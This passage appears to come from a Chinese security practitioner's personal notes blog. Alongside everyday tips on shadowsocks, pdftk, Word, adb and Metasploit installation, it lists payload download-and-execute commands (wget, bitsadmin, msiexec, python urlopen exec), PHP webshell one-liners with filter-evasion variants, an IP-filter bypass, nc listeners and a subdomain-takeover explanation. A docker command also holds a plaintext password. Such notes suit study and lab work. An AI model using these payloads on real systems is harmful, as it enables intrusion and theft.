http://127.0.0.1:81/exp.exe -O test.exe 8. Linux - curl: curl http://127.0.0.1:81/exp.exe -o test.exe</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Windows Bitsadmin/msiexec:</span></span><br><span class=\"line\">bitsadmin /rawreturn /transfer down &quot;http://127.0.0.1:81/exp.exe&quot; c:\\\\test.exe</span><br><span class=\"line\">msiexec /q /i http://127.0.0.1:81/exp.exe</span><br><span class=\"line\">msiexec /q /%os:~1,1%http://127.0.0.1:81/exp.exe</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Python Download:</span> </span><br><span class=\"line\">python -c &quot;import urllib2; exec urllib2.urlopen(&#x27;http://127.0.0.1:81/exp.exe&#x27;).read();&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"ip转为纯数字访问\"><a class=\"markdownIt-Anchor\" href=\"#ip转为纯数字访问\">#</a> ip 转为纯数字访问</h3>\n<p>在线转换地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmVqc29uLmNvbS9jb252ZXJ0L2lwMmludC8=\">https://www.bejson.com/convert/ip2int/</span></p>\n<p>如要访问 <span class=\"exturl\" data-url=\"aHR0cDovLzEuMTE3LjUyLjIxOQ==\">http://1.117.52.219</span> 可以访问 <span class=\"exturl\" data-url=\"aHR0cDovLzI0NDU4NDU5\">http://24458459</span></p>\n<p>其中 1x256<sup>3+117x256</sup>2+52x256+219=24458459</p>\n<p>可以当对方对 ip 做了点过滤的时候进行绕过</p>\n<h3 id=\"一句话木马被过滤\"><a class=\"markdownIt-Anchor\" href=\"#一句话木马被过滤\">#</a> 一句话木马被过滤</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">变形一句话木马</span></span><br><span class=\"line\">&lt;?php eval($_POST[x]);?&gt;</span><br><span class=\"line\">&lt;?=eval($_POST[x]);?&gt;</span><br><span class=\"line\">&lt;?=eval($_POST&#123;x&#125;);?&gt;</span><br><span class=\"line\">&lt;?=system(&#x27;tac ../fl*&#x27;)?&gt;</span><br><span class=\"line\">&lt;?=`tac ../fl*`?&gt;</span><br><span class=\"line\">&lt;? echo `tac /var/www/html/f*`?&gt;</span><br><span class=\"line\">&lt;?php $a=&#x27;syste&#x27;;$b=&#x27;m&#x27;;$c=$a.$b;$c(&#x27;ls ../&#x27;);?&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"mac克隆网站\"><a class=\"markdownIt-Anchor\" href=\"#mac克隆网站\">#</a> mac 克隆网站</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过SiteSucker克隆网站或者wget的方式下载源码</span></span><br><span class=\"line\">wget -r http://word.wd1x.com/</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将源码移动到/Library/WebServer/Documents目录下</span></span><br><span class=\"line\">sudo mv ~/Downloads/word.wd1x.com/ /Library/WebServer/Documents</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置此目录的权限使得任意用户可访问</span></span><br><span class=\"line\">sudo chmod - R 777 /Library/WebServer/Documents/word.wd1x.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">修改apache配置文件，改变index.html指向</span></span><br><span class=\"line\">sudo cp /etc/apache2/httpd.conf /etc/apache2/httpd.conf.bak</span><br><span class=\"line\">sudo vim /etc/apache2/httpd.conf</span><br><span class=\"line\">DirectoryIndex /word.wd1x.com/index.html index.html</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用apachectl操作apache的启动或停止</span></span><br><span class=\"line\">sudo apachectl start/stop/restart</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">访问http://localhost或者http://localhost/word.wd1x.com</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"mac与win上互联\"><a class=\"markdownIt-Anchor\" href=\"#mac与win上互联\">#</a> mac 与 win 上互联</h3>\n<p><strong>mac 查看 win 上某个文件内容并复制</strong></p>\n<ul>\n<li>\n<p>通过终端或者 ssh 连接工具：<br>\nssh <span class=\"exturl\" data-url=\"bWFpbHRvOmFkbWluaXN0cmF0b3JAMTkyLjE2OC4wLjExMQ==\">administrator@192.168.0.111</span><br>\ncd /d “G:\\xiaodi\\37 - 权限维持 &amp; 钓鱼 &amp; MSF 等”<br>\ntype 表单劫持.txt</p>\n</li>\n<li>\n<p>通过 vnc 或者 rdp：直接通过可视化界面复制相关内容</p>\n</li>\n<li>\n<p>通过 nc 工具来实时终端聊天 (需要打开防火墙对应端口)：</p>\n</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">被控端：</span></span><br><span class=\"line\">nc - l -v - v - p 4444 或 nc - lvvp 4444 (命令与nc版本有关)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">控制端：</span></span><br><span class=\"line\">nc 192.168.0.111 4444</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>传输文件时用 scp 或 ssh 连接工具<br>\n scp <span class=\"exturl\" data-url=\"bWFpbHRvOmNoZW50dW9AMTkyLjE2OC4wLjEwMg==\">chentuo@192.168.0.102</span>:~/Desktop/flash.exe.</p>\n</li>\n<li>\n<p>其他：通过设置 smb 或 nfs 来实现共享存储</p>\n</li>\n</ul>\n<p><strong>mac 和 win 实时通讯</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在windows上通过mobex连接到mac，并开启本地监听：</span></span><br><span class=\"line\">nc -l 4444 -v</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在mac上开始将内容发送至 4444:</span> </span><br><span class=\"line\">nc 127.0.0.1 4444</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">此后就可以在两个电脑之间互相发送临时内容了</span></span><br></pre></td></tr></table></figure>\n<p><strong>mac 和 win 共享文件夹</strong></p>\n<p>mac 上开启 smb 文件共享，单独设置一个用户 smbtest 和密码，为其开放指定目录，并在 wifi 的高级设置中 WINS 中添加 windows 的 ip 地址</p>\n<p>win 上通过运行输入 \\192.168.x.x 加入到 mac 的共享文件夹当中即可</p>\n<p>win 上通过 shift+windows+s 键可以截图，并最终保存到共享文件夹当中即可</p>\n<h3 id=\"vulfocus部署\"><a class=\"markdownIt-Anchor\" href=\"#vulfocus部署\">#</a> vulfocus 部署</h3>\n<p>参考地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb2ZhcHJvLmdpdGh1Yi5pby92dWxmb2N1cy8jL0lOU1RBTEw=\">https://fofapro.github.io/vulfocus/#/INSTALL</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过docker 安装vulfocus</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-v /var/run/docker.sock:/var/run/docker.sock 为 docker 交互连接。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-e DOCKER_URL 为 Docker 连接方式，默认通过 unix://var/run/docker.sock 进行连接，也可以通过 tcp://xxx.xxx.xxx.xxx:2375 进行连接（必须开放 2375 端口）。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-v /vulfocus-api/db.sqlite3:db.sqlite3 映射数据库为本地文件。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-e VUL_IP=xxx.xxx.xxx.xxx 为 Docker 服务器 IP ，不能为 127.0.0.1。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-e EMAIL_HOST=<span class=\"string\">&quot;xxx.xxx.xxx&quot;</span> 为邮箱SMTP服务器</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-e EMAIL_HOST_USER=<span class=\"string\">&quot;xxx@xxx.com&quot;</span> 为邮箱账号</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-e EMAIL_HOST_PASSWORD=<span class=\"string\">&quot;xxxxxxxx 为邮箱密码</span></span></span><br><span class=\"line\">docker pull vulfocus/vulfocus:latest</span><br><span class=\"line\">docker create -p 82:80 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=x.42.178.227 -e EMAIL_HOST=&quot;root@mail.com&quot; -e EMAIL_HOST_USER=&quot;root&quot; -e EMAIL_HOST_PASSWORD=&quot;Clash123\\!\\@\\#&quot; vulfocus/vulfocus</span><br><span class=\"line\">docker start container id</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">默认账户密码为 admin/admin。</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"string\">添加镜像-本地导入-选择合适的镜像载入进去</span></span></span><br><span class=\"line\">docker search vulfocus --limit 100</span><br><span class=\"line\">docker search vulfocus/weblogic --limit 100</span><br><span class=\"line\">docker pull vulfocus/log4j2-rce-2021-12-09</span><br></pre></td></tr></table></figure>\n<h3 id=\"快速搭建ss通道\"><a class=\"markdownIt-Anchor\" href=\"#快速搭建ss通道\">#</a> 快速搭建 ss 通道</h3>\n<p>在安全组中开放相应端口：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb25zb2xlLmNsb3VkLnRlbmNlbnQuY29tL3ZwYy9zZWN1cml0eWdyb3VwL2RldGFpbC9zZy1tNXJzZTM4eD9yaWQ9NQ==\">https://console.cloud.tencent.com/vpc/securitygroup/detail/sg-m5rse38x?rid=5</span></p>\n<p>教程一：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYndnc3Mub3JnLzE1NC5odG1s\">https://www.bwgss.org/154.html</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">下载并安装：</span></span><br><span class=\"line\">bash &lt;(curl -sL https://raw.githubusercontent.com/hijkpw/scripts/master/centos_install_ss.sh)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看运行状态：</span></span><br><span class=\"line\">bash &lt;(curl -sL https://raw.githubusercontent.com/hijkpw/scripts/master/centos_install_ss.sh)</span><br><span class=\"line\">info</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">SS卸载：</span></span><br><span class=\"line\">bash&lt;(curl -sL https://raw.githubusercontent.com/hijkpw/scripts/master/centos_install_ss.sh)</span><br><span class=\"line\">uninstall</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">SS 管理命令：</span></span><br><span class=\"line\">启动：systemctl start shadowsocks-libev</span><br><span class=\"line\">停止：systemctl stop shadowsocks-libev</span><br><span class=\"line\">重启：systemctl restart shadowsocks-libev</span><br></pre></td></tr></table></figure>\n<p>教程二：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudGFuZ3l1ZWNhbi5jb20vMjAxOS8wOS8yMC8lRTQlQjglODAlRTUlODglODYlRTklOTIlOUYlRTUlOUMlQThjZW50b3MlRTQlQjglOEElRTYlOTAlQUQlRTUlQkIlQkFzcyVFNiU5QyU4RCVFNSU4QSVBMSVFNSU5OSVBOC8=\">https://www.tangyuecan.com/2019/09/20 / 一分钟在 centos 上搭建 ss 服务器 /</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">一键安装 shadowsocks-go 版：</span></span><br><span class=\"line\">wget –no-check-certificate https://tangyuecan.com/shadowsocks-go.sh</span><br><span class=\"line\">chmod +x shadowsocks-go.sh</span><br><span class=\"line\">./shadowsocks-go.sh 2&gt;&amp;1 | tee shadowsocks-go.log</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">卸载</span></span><br><span class=\"line\">./shadowsocks.sh uninstall</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">重启</span></span><br><span class=\"line\">/etc/init.d/shadowsocks restart</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看配置</span></span><br><span class=\"line\">/etc/shadowsocks/config.json</span><br></pre></td></tr></table></figure>\n<p>客户端下载地址</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">windows</span></span><br><span class=\"line\">https://github.com/shadowsocks/shadowsocks-windows/releases</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">macos</span></span><br><span class=\"line\">https://github.com/shadowsocks/ShadowsocksX-NG/releases</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">检验</span></span><br><span class=\"line\">curl --proxy 127.0.0.1:1087 &quot;http://httpbin.org/ip&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"nginx域名指定目录\"><a class=\"markdownIt-Anchor\" href=\"#nginx域名指定目录\">#</a> nginx 域名指定目录</h3>\n<p>将新买的域名解析到指定服务器 ip：通过云服务后台操作（1.5h）</p>\n<p>域名绑定目录的配置文件都放到这里：/usr/local/nginx/conf/vhost/</p>\n<p>在该目录下，新建一个文件，命名：域名.conf； 如：www.baidu.com.conf</p>\n<p>指定网站目录：如 /data/wwwroot/www.nmap.asia</p>\n<p>重启 nginx：systemctl restart nginx</p>\n<p>将 nginx 关闭之后，在服务器上随便开启的网站都会被解析到此域名</p>\n<h3 id=\"pdftk操作pdf\"><a class=\"markdownIt-Anchor\" href=\"#pdftk操作pdf\">#</a> pdftk 操作 pdf</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">谷歌翻译限制 10 M，可利用此方法拆分后一一翻译在合并</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装pdftk工具：</span></span><br><span class=\"line\">brew install pdftk-java</span><br><span class=\"line\">brew install openjdk@11</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">拆分pdf为两个文件：</span></span><br><span class=\"line\">pdftk penetrationtestingazureforethicalhackers.pdf cat 1-200 output book-1.pdf</span><br><span class=\"line\">pdftk penetrationtestingazureforethicalhackers.pdf cat 201-352 output book-2.pdf</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将分隔后的再次合并：</span></span><br><span class=\"line\">pdftk book-1.pdf book-2.pdf cat output azure-book.pdf</span><br><span class=\"line\">pdftk A=book-1 \\(Chinese\\).pdf B=book-2 \\(Chinese\\).pdf cat A B output azure-book.pdf</span><br></pre></td></tr></table></figure>\n<h3 id=\"反弹失败原因\"><a class=\"markdownIt-Anchor\" href=\"#反弹失败原因\">#</a> 反弹失败原因</h3>\n<ul>\n<li>\n<p>腾讯云安全组端口没有开放造成的无法反弹</p>\n</li>\n<li>\n<p>linux 的防火墙未关闭或没有允许端口入流量导致<br>\n <code>systemctl status firewalld</code></p>\n</li>\n<li>\n<p>linux 的 iptables 路由规则有限制导致<br>\n <code>iptables -L -n</code> <br>\n <code>iptables -A INPUT -p tcp --dport 4444 -j ACCEPT</code></p>\n</li>\n</ul>\n<h3 id=\"破解网盘速度限制\"><a class=\"markdownIt-Anchor\" href=\"#破解网盘速度限制\">#</a> 破解网盘速度限制</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">为浏览器下载并安装油猴插件：</span></span><br><span class=\"line\">https://www.tampermonkey.net/</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">为油猴插件下载网盘直链脚本：</span></span><br><span class=\"line\">https://greasyfork.org/zh-CN/scripts/418182-%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E7%AE%80%E6%98%93%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B-%E7%9B%B4%E9 %93%BE%E4%B8%8B%E8%BD%BD%E5%A4%8D%E6%B4%BB%E7%89%88</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在电脑上安装下载器：</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">windows可下载IDM下载工具：</span></span><br><span class=\"line\">https://softxm.lanzoui.com/idNdO0458y9g</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">macOS可下载NDM下载工具（油小猴）：</span></span><br><span class=\"line\">https://www.baiduyun.wiki/download.html</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">IDM/NDM配置线程及UA：</span></span><br><span class=\"line\">https://www.cnblogs.com/softxmm/p/13972678.html#idm</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">网页百度网盘生成单个文件的url地址：http://pan.baidu.com/</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将url导入到IDM/NDM进行下载：下载并配置好的这两个工具之一</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"> 油小猴附带有其他下载方案，但是速度受到了限制</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"pwsh基本操作\"><a class=\"markdownIt-Anchor\" href=\"#pwsh基本操作\">#</a> pwsh 基本操作</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">检查当前的powershell版本</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">PSVersionTable.PSVersion</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装最新版的powershell方法：</span></span><br><span class=\"line\">https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell?view=powershell-7.2</span><br></pre></td></tr></table></figure>\n<p><strong>键盘打开管理员权限的 powershell 按 windows 键，然后输入 pwsh，然后同时按 按 Ctrl+ Shift + Enter 键。再弹出的对话框中选择是，就可以弹出管理员权限的 pwsh。</strong></p>\n<h3 id=\"word的一些操作\"><a class=\"markdownIt-Anchor\" href=\"#word的一些操作\">#</a> word 的一些操作</h3>\n<ul>\n<li>word 批量替换 [x] 为上标的方法</li>\n</ul>\n<p>ctrl+h 调出查找与替换模块，选择高级替换与查找， 查找内容勾选为使用通配符、内容填写 [<span 1,3>0-9</span>] 并且不限定格式，替换后的内容不填但是要选择字符格式中的上标格式。选择全部替换就可以改掉了。</p>\n<p>[<span 1,2>0-9</span>](适用两位编号，三位为 {1,3}) 即 [<span 1,3>0-9</span>]</p>\n<p>[<span 1,2>0-9</span>?<span 1,2>0-9</span>](适用两位编号，三位为 {1,3}) 即 [<span 1,2>0-9</span>?<span 1,3>0-9</span>](</p>\n<ul>\n<li>word 引用自定义目录的方法</li>\n</ul>\n<p>先将自己的标题统一设置为样式 - 这里选择以标题 3，4，5 作为自己的一二三级目录</p>\n<p>引用目录 - 自定义目录 - 选择目录深度 (需显示两级目录则选择为 4，即显示设置的一二)</p>\n<p>选择修改目录中的 TOC3、TOC4 依次进行修改</p>\n<p>TOC3 即原本的标题 3 是自己想要展示的一级目录，我设置了新罗马小四字，段落前后 间距 0 行，是 1.5 倍行距</p>\n<p>TOC4 即原本的标题 4 是自己想要展示的二级目录，我设置了新罗马 11 字，段落前间距 0 行，段落缩进 0.5cm，固定 20 磅行距</p>\n<h3 id=\"子域名接管\"><a class=\"markdownIt-Anchor\" href=\"#子域名接管\">#</a> 子域名接管</h3>\n<p>（1）域名解析记录类型</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">记录类型</span></span><br><span class=\"line\">A-将域名指向一个IPV 4 地址</span><br><span class=\"line\">CNAME-将域名指向另外一个域名</span><br><span class=\"line\">AAAA-将域名指向一个IPV 6 地址</span><br><span class=\"line\">NS-将子域名指向其他DNS服务器解析</span><br><span class=\"line\">MX-将域名执行邮件服务器地址</span><br><span class=\"line\">SRV-记录提供特定服务的服务器</span><br></pre></td></tr></table></figure>\n<p>（2）子域名接管</p>\n<p>A 域名通过 CNAME 解析到了 B 域名，而 B 域名又通过 CNAME 解析到了 C 域名，那么此时 A 域名是直接解析到了 C 域名下。如果 B 域名过期了且没有被注册，那么可以直接通过 B 域名来控制 A 域名的界面，因为 A 域名是一个更权威的界面，是更容易让人相信的。</p>\n<h3 id=\"adb相关命令\"><a class=\"markdownIt-Anchor\" href=\"#adb相关命令\">#</a> adb 相关命令</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">一般命令</span></span><br><span class=\"line\">adb devices</span><br><span class=\"line\">adb connect 127.0.0.1:5037</span><br><span class=\"line\">adb root shell</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">adb默认端口 5037 被占用的解决办法</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">找到被哪个进程号占用了</span></span><br><span class=\"line\">netstat - ano | findstr 5037</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看此进程号是什么任务</span></span><br><span class=\"line\">tasklist | findstr 11111</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">删除此进程</span></span><br><span class=\"line\">taskkill /pid 11111</span><br></pre></td></tr></table></figure>\n<ul>\n<li>雷神模拟器的 adb shell 没有 root，可以先换逍遥或者 nox 尝试</li>\n</ul>\n<p>逍遥模拟器命令 adb devices 查看设备，只显示 List of devices attached，设备列表显示为空<br>\n①关闭任务管理器中的 adb.exe 关闭逍遥模拟器<br>\n②打开 adb 目录，复制 adb.exe<br>\n③打开逍目录下的 \\Microvirt\\MEmu\\adb.exe 并备份，将复制的 adb.exe 粘贴<br>\n④再次运行逍遥模拟器的虚拟机 adb devices 将成功显示设备列表</p>\n<h3 id=\"linux-install-msf\"><a class=\"markdownIt-Anchor\" href=\"#linux-install-msf\">#</a> linux install msf</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">一键安装 msf</span></span><br><span class=\"line\">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">判断msfconsole位置</span></span><br><span class=\"line\">whereis,type,which msfconsole</span><br><span 